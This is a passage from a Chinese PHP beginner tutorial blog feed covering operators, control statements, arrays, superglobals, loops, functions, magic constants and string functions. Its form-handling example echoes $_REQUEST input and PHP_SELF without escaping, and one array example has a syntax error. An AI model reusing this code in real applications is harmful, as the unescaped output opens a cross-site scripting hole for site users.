operator）也称为太空船操作符，符号为 **&lt;=&gt;**。组合比较运算符可以轻松实现两个变量的比较，也不仅限于数值类数据的比较。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c &#x3D; $a &lt;&#x3D;&gt; $b;</span><br></pre></td></tr></table></figure><ul><li>如果 <strong>$a &gt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>1</strong>。</li><li>如果 <strong>$a == $b</strong>, 则 <strong>$c</strong> 的值为 <strong>0</strong>。</li><li>如果 <strong>$a &lt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>-1</strong>。</li></ul><h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级:"></a>运算符优先级:</h4><p>运算符的优先级口诀：括（号）、单（操作数）、算（术）、移（位）、关（系）；位（运算符）、逻（辑）、条（件）、赋（值）、逗（号）。or 和 ||，&amp;&amp; 和 and 都是逻辑运算符，效果一样，但是其优先级却不一样。我们<strong>通过括号的配对来明确标明运算顺序，而非靠运算符优先级和结合性来决定，通常能够增加代码的可读性。</strong></p><h2 id="PHP语句"><a href="#PHP语句" class="headerlink" title="PHP语句"></a>PHP语句</h2><h4 id="if-语句："><a href="#if-语句：" class="headerlink" title="if 语句："></a>if 语句：</h4><p>if 语句用于<strong>仅当指定条件成立时执行代码</strong>。</p><h4 id="PHP-if…else-语句"><a href="#PHP-if…else-语句" class="headerlink" title="PHP - if…else 语句:"></a>PHP - if…else 语句:</h4><p>在条件成立时执行一块代码，条件不成立时执行另一块代码。</p><h4 id="PHP-if…elseif…-else-语句"><a href="#PHP-if…elseif…-else-语句" class="headerlink" title="PHP - if…elseif….else 语句:"></a>PHP - if…elseif….else 语句:</h4><p>在若干条件之一成立时执行一个代码块。</p><h4 id="Switch-语句："><a href="#Switch-语句：" class="headerlink" title="Switch 语句："></a>Switch 语句：</h4><p>switch 语句用于根据多个不同条件执行不同动作，有选择地执行若干代码块之一。</p><p>工作原理：首先对一个简单的表达式 <em>n</em>（通常是变量）进行一次计算。将表达式的值与结构中每个 case 的值进行比较。如果存在匹配，则执行与 case 关联的代码。代码执行后，使用 <strong>break</strong> 来阻止代码跳入下一个 case 中继续执行。<strong>default</strong> 语句用于不存在匹配（即没有 case 为真）时执行。</p><h2 id="PHP-数组array"><a href="#PHP-数组array" class="headerlink" title="PHP 数组array()"></a>PHP 数组array()</h2><p>数组是一个能在单个变量中存储多个值的特殊变量。</p><ul><li><strong>数值数组</strong> - 带有数字 ID 键的数组</li><li><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</li><li><strong>多维数组</strong> - 包含一个或多个数组的数组</li></ul><h4 id="count-函数"><a href="#count-函数" class="headerlink" title="count() 函数:"></a>count() 函数:</h4><p>count() 函数用于返回数组的长度（元素的数量)。</p><h4 id="PHP-数值数组："><a href="#PHP-数值数组：" class="headerlink" title="PHP 数值数组："></a>PHP 数值数组：</h4><p>这里有两种创建数值数组的方法：</p><p>自动分配 ID 键（ID 键总是从 0 开始）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cars&#x3D;array(&quot;rose&quot;,&quot;lisa&quot;,&quot;jennie&quot;&quot;jisoo&quot;);</span><br></pre></td></tr></table></figure><p>人工分配 ID 键：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cars[0]&#x3D;&quot;rose&quot;;</span><br><span class="line">$cars[1]&#x3D;&quot;lisa&quot;;</span><br><span class="line">$cars[2]&#x3D;&quot;jennie&quot;;</span><br><span class="line">$cars[3]&#x3D;&quot;jisoo&quot;;</span><br></pre></td></tr></table></figure><h4 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组:"></a>遍历数值数组:</h4><p>遍历并打印数值数组中的所有值，可以使用 for 循环。</p><h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组:"></a>关联数组:</h4><p>使用分配给数组的指定的键的数组。</p><p>法一:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$age&#x3D;array(&quot;Jane&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);</span><br></pre></td></tr></table></figure><p>法二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$age[&#39;Jane&#39;]&#x3D;&quot;35&quot;;</span><br><span class="line">$age[&#39;Ben&#39;]&#x3D;&quot;37&quot;;</span><br><span class="line">$age[&#39;Joe&#39;]&#x3D;&quot;43&quot;;</span><br></pre></td></tr></table></figure><h2 id="PHP-数组排序"><a href="#PHP-数组排序" class="headerlink" title="PHP 数组排序"></a>PHP 数组排序</h2><p>数组中的元素可以按字母或数字顺序进行降序或升序排列。</p><ul><li>sort() - 对数组进行升序排列</li><li>rsort() - 对数组进行降序排列</li><li>asort() - 根据数组的值，对数组进行升序排列</li><li>ksort() - 根据数组的键，对数组进行升序排列</li></ul><h2 id="PHP-超级全局变量"><a href="#PHP-超级全局变量" class="headerlink" title="PHP 超级全局变量"></a>PHP 超级全局变量</h2><p>超级变量在全部作用域中都可用，不需要特别说明。</p><h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h4><p>包含了全部变量的全局组合数组</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><p>包含了头信息(header)、路径(path)、以及脚本位置(script locations)等信息的数组，数组中的项目由 Web 服务器创建。</p><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>用于收集HTML表单提交的数据。以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至<form>标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据。</form></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;</span><br><span class="line">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php </span><br><span class="line">$name &#x3D; $_REQUEST[&#39;fname&#39;]; </span><br><span class="line">echo $name; </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><p>用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。(用法与上述$_REQUEST类似)</p><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><p>$GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。$_GET 也可以收集URL中发送的数据。</p><h2 id="PHP-循环"><a href="#PHP-循环" class="headerlink" title="PHP 循环"></a>PHP 循环</h2><h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><p> 只要指定的条件成立，则循环执行代码块。</p><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (条件)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下实例变量 <em>i</em> 的初始值为 9。然后只要 <em>i</em> 小于或者等于 13，while 循环将继续运行。循环每运行一次，<em>i</em> 就会递增 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$i&#x3D;9;</span><br><span class="line">while($i&lt;&#x3D;13)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The number is 9</span><br><span class="line">The number is 10</span><br><span class="line">The number is 11</span><br><span class="line">The number is 12</span><br><span class="line">The number is 13</span><br></pre></td></tr></table></figure><h4 id="do…while-语句"><a href="#do…while-语句" class="headerlink" title="do…while 语句"></a>do…while 语句</h4><p>do…while 语句执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p><p>语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">while (条件);</span><br></pre></td></tr></table></figure><h4 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h4><p>for 循环用于预先知道脚本需要运行的次数的情况。</p><p>语法如下：其中的<strong>初始值</strong>和<strong>增量</strong>参数可为空或者有多个表达式（用逗号分隔）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (初始值; 条件; 增量)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例如下:定义一个初始值为 i=8的循环，只要变量 <strong>i</strong> 小于或者等于 10，循环将继续运行。循环每运行一次，变量 <strong>i</strong> 就会递增 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i&#x3D;8; $i&lt;&#x3D;10; $i++)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;i&#x3D; &quot; . $i . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D; 8</span><br><span class="line">i&#x3D; 9</span><br><span class="line">i&#x3D; 10</span><br></pre></td></tr></table></figure><h4 id="foreach-循环"><a href="#foreach-循环" class="headerlink" title="foreach 循环"></a>foreach 循环</h4><p>foreach 循环用于遍历数组。</p><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($array as $key &#x3D;&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语法与上面类似，但下面的语法中元素的键与值都会被赋值给 $key 和 $value 变量。</p><h2 id="PHP-函数"><a href="#PHP-函数" class="headerlink" title="PHP 函数"></a>PHP 函数</h2><p>函数是通过调用函数来执行的,可以在页面的任何位置调用函数。</p><h4 id="创建-PHP-函数"><a href="#创建-PHP-函数" class="headerlink" title="创建 PHP 函数"></a>创建 PHP 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function functionName()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 要执行的代码</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>函数的名称应该提示出它的功能</strong></li><li><strong>函数名称以字母或下划线开头（不能以数字开头）</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function write_song()</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;wonderful u&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo &quot;I want to listen to &quot;;</span><br><span class="line">write_song();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果为 ：I want to listen to wonderful u.</p><h4 id="PHP-函数-添加参数"><a href="#PHP-函数-添加参数" class="headerlink" title="PHP 函数 - 添加参数"></a>PHP 函数 - 添加参数</h4><p>参数类似变量,参数就在函数名称后面的一个括号内指定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function idol($combination,$punctuation)</span><br><span class="line">&#123;</span><br><span class="line">    echo $combination . &quot; blackpink&quot; . $punctuation . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo &quot;My first idol is &quot;;</span><br><span class="line">idol(&quot;rose&quot;,&quot;.&quot;);</span><br><span class="line">echo &quot;My second idol is &quot;;</span><br><span class="line">idol(&quot;lisa&quot;,&quot;!&quot;);</span><br><span class="line">echo &quot;My third idol is &quot;;</span><br><span class="line">idol(&quot;jennie&quot;,&quot;?&quot;);</span><br><span class="line">echo &quot;My forth idol is &quot;;</span><br><span class="line">idol(&quot;jisoo&quot;,&quot;?&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">My first idol is rose blackpink.</span><br><span class="line">My second idol is lisa blackpink!</span><br><span class="line">My third idol is jennie blackpink?</span><br><span class="line">My forth idol is jisoo blackpink?</span><br></pre></td></tr></table></figure><h2 id="PHP-魔术常量"><a href="#PHP-魔术常量" class="headerlink" title="PHP 魔术常量"></a>PHP 魔术常量</h2><p>魔术常量的值随着它们在代码中的位置改变而改变。魔术常量的两边都要加上两个下划线。</p><h4 id="LINE"><a href="#LINE" class="headerlink" title="LINE"></a><strong>LINE</strong></h4><p>文件中的当前行号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;这是第 &quot; &#39;  . __LINE__ . &#39; &quot; 行&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以上实例输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是第 “ 2 ” 行</span><br></pre></td></tr></table></figure><h4 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a><strong>FILE</strong></h4><p>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。</p><h4 id="DIR"><a href="#DIR" class="headerlink" title="DIR"></a><strong>DIR</strong></h4><p>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。</p><p>它等价于 __FILE__，如果是根目录，则目录中名包括末尾的斜杠。</p><h4 id="FUNCTION"><a href="#FUNCTION" class="headerlink" title="FUNCTION"></a><strong>FUNCTION</strong></h4><p>返回该函数被定义时的名字（区分大小写）。</p><h4 id="CLASS"><a href="#CLASS" class="headerlink" title="CLASS"></a><strong>CLASS</strong></h4><p>返回该类被定义时的名字（区分大小写），类名包括其被声明的作用区域。</p><h4 id="METHOD"><a href="#METHOD" class="headerlink" title="METHOD"></a><strong>METHOD</strong></h4><p>返回该方法被定义时的名字（区分大小写）。</p><h4 id="NAMESPACE"><a href="#NAMESPACE" class="headerlink" title="NAMESPACE"></a><strong>NAMESPACE</strong></h4><p>当前命名空间的名称（区分大小写），此常量是在编译时定义的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(一)</title>
    <link href="/2020/10/10/php%20(%E4%B8%80)/"/>
    <url>/2020/10/10/php%20(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP（一）"><a href="#PHP（一）" class="headerlink" title="PHP（一）"></a>PHP（一）</h1><ul><li><p>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</p></li><li><p>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</p></li><li><p>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</p></li><li><p>PHP 文件的默认文件扩展名是 “.php”</p></li><li><p><a href="#php%E4%B8%80">PHP（一）</a></p><ul><li><a href="#%E5%8F%98%E9%87%8F">变量</a><ul><li><a href="#php-%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F">PHP 变量作用域</a><ul><li><a href="#global%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Global:全局变量作用域</strong></a></li><li><a href="#static-%E9%9D%99%E6%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Static :静态作用域</strong></a></li><li><a href="#local%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>local:局部变量的作用域</strong></a></li><li><a href="#parameter%E5%8F%82%E6%95%B0%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>parameter：参数作用域</strong></a></li></ul></li></ul></li><li><a href="#php-echo-%E5%92%8C-print-%E8%AF%AD%E5%8F%A5">PHP echo 和 print 语句</a></li><li><a href="#php-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">PHP  数据类型</a><ul><li><a href="#php-%E5%AD%97%E7%AC%A6%E4%B8%B2string">PHP 字符串(string)</a></li><li><a href="#php-%E5%B9%B6%E7%BD%AE%E8%BF%90%E7%AE%97%E7%AC%A6">PHP 并置运算符</a></li><li><a href="#php-%E6%95%B4%E5%9E%8Binteger">PHP 整型(Integer)</a></li><li><a href="#php-%E6%B5%AE%E7%82%B9%E5%9E%8Bfloat">PHP 浮点型（float）</a></li><li><a href="#php-%E5%B8%83%E5%B0%94%E5%9E%8B-boolean">PHP 布尔型( Boolean)</a></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP 数组(array)</a></li><li><a href="#php-%E5%AF%B9%E8%B1%A1">PHP 对象</a></li><li><a href="#php-null-%E5%80%BC">PHP NULL 值</a></li></ul></li><li><a href="#php-%E5%B8%B8%E9%87%8F">PHP 常量</a><ul><li><a href="#%E8%AE%BE%E7%BD%AE-php-%E5%B8%B8%E9%87%8F">设置 PHP 常量</a></li><li><a href="#php-strlen-%E5%87%BD%E6%95%B0">PHP strlen() 函数</a></li><li><a href="#php-strpos-%E5%87%BD%E6%95%B0">PHP strpos() 函数</a></li></ul></li></ul></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是用于存储信息的”容器”。（php与C语言比较类似）</p><ul><li>变量以 $ 符号开始，后面跟着变量的名称</li><li><strong>变量名必须以字母或者下划线字符开始</strong></li><li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li><li>变量名不能包含空格</li><li>变量名和语句都是区分大小写的（$y 和 $Y 是两个不同的变量）</li><li>赋一个文本值给变量时，需在文本值两侧加上引号。</li></ul><h3 id="PHP-变量作用域"><a href="#PHP-变量作用域" class="headerlink" title="PHP 变量作用域"></a>PHP 变量作用域</h3><p>变量的作用域是脚本中变量可被引用/使用的部分。</p><h5 id="Global-全局变量作用域"><a href="#Global-全局变量作用域" class="headerlink" title="Global:全局变量作用域"></a><strong>Global:全局变量作用域</strong></h5><p>除了函数外，全局变量(即在函数外声明，无法在函数内声明的变量。同理:在函数内声明,无法在函数外声明的变量为局部变量。<strong>因此可以在不同函数中使用相同的变量名称，因为这些函数内定义的变量名是局部变量，只作用于该函数内。</strong>关于局部变量和全局变量的优先级，因为在PHP中函数都有自己单独的作用域，所以在局部变量的优先级要大于全局变量（在你不声明这个变量之前），声明之后此变量就变成了局部变量如果修改值那么全局变量的值也会改变。)可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p><p>在源代码中，global $x,$y;    $y=$x+$y; 和 $GLOBALS[‘y’]=$GLOBALS[‘x’]+$GLOBALS[‘y’]; 是等效的。</p><h5 id="Static-静态作用域"><a href="#Static-静态作用域" class="headerlink" title="Static :静态作用域"></a><strong>Static :静态作用域</strong></h5><p>当一个函数完成时，它的所有变量通常都会被删除。但有时候您希望某个局部变量不要被删除可以在您第一次声明变量时使用 <strong>static</strong> 关键字。每次调用该函数时，该变量将会保留着函数前一次被调用时的值。</p><h5 id="local-局部变量的作用域"><a href="#local-局部变量的作用域" class="headerlink" title="local:局部变量的作用域"></a><strong>local:局部变量的作用域</strong></h5><p>在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。</p><h5 id="parameter：参数作用域"><a href="#parameter：参数作用域" class="headerlink" title="parameter：参数作用域"></a><strong>parameter：参数作用域</strong></h5><p>参数是通过调用代码将值传递给函数的局部变量。</p><h2 id="PHP-echo-和-print-语句"><a href="#PHP-echo-和-print-语句" class="headerlink" title="PHP echo 和 print 语句"></a>PHP echo 和 print 语句</h2><ul><li>echo - 可以输出一个或多个字符串(字符串可以包含 HTML 标签)</li><li>print - 只允许输出一个字符串，返回值总为 1</li><li>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</li></ul><h2 id="PHP-数据类型"><a href="#PHP-数据类型" class="headerlink" title="PHP  数据类型"></a>PHP  数据类型</h2><h4 id="PHP-字符串-string"><a href="#PHP-字符串-string" class="headerlink" title="PHP 字符串(string)"></a>PHP 字符串(string)</h4><p>一个字符串是一串字符的序列,可以将任何文本放在单引号和双引号中。字符串变量用于包含有字符的值。</p><h4 id="PHP-并置运算符"><a href="#PHP-并置运算符" class="headerlink" title="PHP 并置运算符"></a>PHP 并置运算符</h4><p>并置运算符 (.) 用于把两个字符串值连接起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1&#x3D;&quot;What a handsome boy!&quot;;</span><br><span class="line">$txt2&#x3D;&quot;I want to pursue him!&quot;;</span><br><span class="line">echo $txt1 . &quot; &quot; . $txt2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上面的代码将输出：What a handsome boy!I want to pursue him!</p><h4 id="PHP-整型-Integer"><a href="#PHP-整型-Integer" class="headerlink" title="PHP 整型(Integer)"></a>PHP 整型(Integer)</h4><ul><li>整数必须至少有一个数字 (0-9)</li><li>整数不能包含逗号或空格</li><li>整数是没有小数点的</li><li>整数可以是正数或负数</li><li>整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）.</li></ul><h4 id="PHP-浮点型（float）"><a href="#PHP-浮点型（float）" class="headerlink" title="PHP 浮点型（float）"></a>PHP 浮点型（float）</h4><p>浮点数是带小数部分的数字，或是指数形式。</p><h4 id="PHP-布尔型-Boolean"><a href="#PHP-布尔型-Boolean" class="headerlink" title="PHP 布尔型( Boolean)"></a>PHP 布尔型( Boolean)</h4><p>布尔型可以是 TRUE 或 FALSE，通常用于条件判断。</p><h4 id="PHP-数组-array"><a href="#PHP-数组-array" class="headerlink" title="PHP 数组(array)"></a>PHP 数组(array)</h4><p>数组可以在一个变量中存储多个值。</p><h4 id="PHP-对象"><a href="#PHP-对象" class="headerlink" title="PHP 对象"></a>PHP 对象</h4><p>对象数据类型也可以用于存储数据.在 PHP 中，必须使用class关键字声明类对象,类是可以包含属性和方法的结构。PHP关键字this指向当前对象实例的指针，不指向任何其他对象或类。</p><h4 id="PHP-NULL-值"><a href="#PHP-NULL-值" class="headerlink" title="PHP NULL 值"></a>PHP NULL 值</h4><p>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。</p><p>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。</p><h2 id="PHP-常量"><a href="#PHP-常量" class="headerlink" title="PHP 常量"></a>PHP 常量</h2><p>常量是一个简单值的标识符。该值在脚本的其它任何地方都不能改变。一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符,不然会将常量转换成新的未定义变量使用，会导致报错)。<strong>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</strong></p><h4 id="设置-PHP-常量"><a href="#设置-PHP-常量" class="headerlink" title="设置 PHP 常量"></a>设置 PHP 常量</h4><p> define() 函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] )</span><br></pre></td></tr></table></figure><ul><li><strong>name：</strong>必选参数，常量名称，即标志符。</li><li><strong>value：</strong>必选参数，常量的值。</li><li><strong>case_insensitive</strong> ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li></ul><h4 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h4><p> 常常用在循环和其他函数中</p><p>strlen() 函数返回字符串的长度（字节数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strlen(&quot;功夫熊猫&quot;);   &#x2F;&#x2F; 输出 12</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果为 12，因为一个中文占 3 个字符数。</p><p>可以使用 mb_strlen 设置指定编码输出中文字符个数(中文下的字符在 UTF-8 下是 3 个字符长度，在 gbk 下是2个字符长度)</p><h4 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。(mb_strpos 按字处理，strpos 按字符处理)</p><p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strpos(&quot;what a handsome boy!&quot;,&quot;handsome&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上面的代码将输出：7</p><p>在上面的实例中，字符串 “handsome” 的位置是 7。之所以是 7而不是 8 的原因是，字符串中第一个字符的位置是 0，而不是 1。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>markdown</title>
    <link href="/2020/10/09/markdown/"/>
    <url>/2020/10/09/markdown/</url>
    
